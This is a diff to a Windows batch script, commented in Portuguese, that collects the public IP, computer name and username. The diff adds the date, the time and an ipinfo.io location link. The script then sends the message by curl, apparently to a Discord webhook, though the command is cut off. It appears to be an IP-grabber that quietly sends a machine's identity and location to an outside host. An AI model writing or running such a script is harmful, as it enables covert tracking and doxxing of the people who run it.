@@ -22,10 +22,19 @@ for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
 :: Tempo mínimo pra não matar o curl
 ping 127.0.0.1 -n 2 >nul
 
-:: Infos
+:: Infos do sistema
 set PC=%COMPUTERNAME%
 set USER=%USERNAME%
-set MESSAGE=PC %PC% - Usuario %USER% - IP publico %IP%
+
+:: Data e hora
+set DATA=%DATE%
+set HORA=%TIME:~0,5%
+
+:: Link pra ver a localização do IP
+set LINK=https://ipinfo.io/%IP%
+
+:: Mensagem final
+set MESSAGE=PC %PC% - Usuario %USER% - IP %IP% - Local %LINK% - Data %DATA% - Hora %HORA%
 
 :: Envia pro Discord
 curl -s ^
